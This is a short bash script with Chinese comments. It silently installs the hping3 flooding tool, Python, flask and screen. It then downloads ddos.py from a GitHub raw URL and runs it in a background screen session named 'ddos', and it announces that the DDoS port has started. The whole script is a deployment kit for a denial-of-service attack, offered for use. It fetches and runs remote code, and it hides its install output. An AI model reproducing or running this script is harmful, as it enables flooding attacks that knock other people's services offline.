#!/bin/bash

# 静默安装hping3
if ! command -v hping3 &> /dev/null
then
    apt-get update > /dev/null 2>&1
    apt-get install -y hping3 > /dev/null 2>&1
    echo -e "\033[31m安装hping3完成\033[0m" # 红色字体提示安装hping3完成
else
    echo -e "\033[31m已安装hping3\033[0m"
fi

# 下载ddos.py
wget -q https://raw.githubusercontent.com/Meatbuns666/ddoss/refs/heads/main/ddos.py

# 忽略提示安装python3和pip3
if ! command -v python3 &> /dev/null
then
    apt-get install -y python3 > /dev/null 2>&1
fi

if ! command -v pip3 &> /dev/null
then
    apt-get install -y python3-pip > /dev/null 2>&1
fi

# 安装flask，忽略所有潜在的问题和警告
pip3 install flask --ignore-installed --no-warn-script-location --break-system-packages > /dev/null 2>&1

# 安装screen（如果没有安装）
if ! command -v screen &> /dev/null
then
    apt-get install -y screen > /dev/null 2>&1
fi

# 创建screen会话并在后台运行ddos.py
screen -dmS ddos python3 ddos.py

# 提示用户DDOS端口启动完成
echo -e "\033[31mDDOS端口启动完成\033[0m"
